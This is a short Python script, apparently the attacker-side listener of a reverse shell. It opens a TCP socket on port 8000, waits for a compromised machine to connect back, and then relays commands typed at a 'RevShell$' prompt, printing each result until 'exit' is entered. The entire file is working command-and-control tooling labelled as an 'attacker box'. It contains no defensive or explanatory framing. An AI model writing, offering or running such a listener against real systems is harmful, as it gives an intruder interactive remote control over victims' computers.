from os import access, device_encoding
from socket import *

serverPort = 8000
serverSocket = socket(AF_INET,SOCK_STREAM) #Create IPv4 TCP socket
serverSocket.setsockopt(SOL_SOCKET,SO_REUSEADDR, 1) 
serverSocket.bind(('',serverPort)) #bind() take two parameters, IP addr and port. If IP is empty the function will use de default IP addr assigned
serverSocket.listen(1) #Listening for connections
print("Attacker box listening...")

connectionSocket,addr = serverSocket.accept() #Object to send and receive commands
print("Connected "
    +str(addr))

message = connectionSocket.recv(1024)
print(message)
command =""
while command != "exit":
    command = input("RevShell$ :")
    connectionSocket.send(command.encode())
    message = connectionSocket.recv(1024).decode()
    print(message)

connectionSocket.shutdown(SHUT_RDWR) #Quick gateway to close it
connectionSocket.close()
